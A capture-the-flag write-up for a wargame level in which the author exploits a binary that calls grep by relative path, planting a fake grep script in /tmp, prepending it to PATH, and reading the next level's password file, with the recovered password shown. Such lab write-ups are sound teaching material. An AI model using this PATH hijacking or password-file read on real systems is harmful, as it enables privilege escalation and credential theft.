# Level 3

## Details
**Vulnerability:** Relative Path Manipulation

**Memory Security:** None

**Description**

This challenge was a binary called proclist that basically lists a process based on user input. So for example, if I typed "sh", proclist would show any PIDs named "sh". However, in the code, it calls grep without specifying the full path - i.e. /bin/grep. This is called a relative path and the OS searches for the grep binary based on the PATH environment variable. As an attacker, we can modify our PATH environment variable and trick the OS into calling a malicious version of grep. 

Vulnerable Code:
```bash
// Execute the command to list the programs
command = "/bin/ps |grep ";
command += program;
system(command.c_str());
```

## Exploit
Create a bash script called "grep" that reads the password from level4's home directory:
```bash
level3@blackbox:/tmp/hp3$ cat grep
#!/bin/sh
cat /home/level4/password
```

Prepend the tmp directory at the beginning of the PATH environment variable and make "grep" script executable:
```bash
level3@blackbox:/tmp/hp3$ export PATH=/tmp/hp3:$PATH
level3@blackbox:/tmp/hp3$ chmod +x grep
```

Exploit:
```bash
level3@blackbox:/tmp/hp3$ ~/proclist 
Enter the name of the program: ls
BashingSh
```

**Blooper** 

When I was completing this challenge, for some reason in my shell script, using #!/bin/bash resulted in an access error. I'm not entirely sure why this happened as /bin/sh is a symlink to /bin/bash. Also, running sh --version and bash --version produce the same output. What's weird though is if you type sh, it drops you into a sh terminal. Maybe for backwards compatibility? I'm not entirely sure, but I'd love to know the answer!

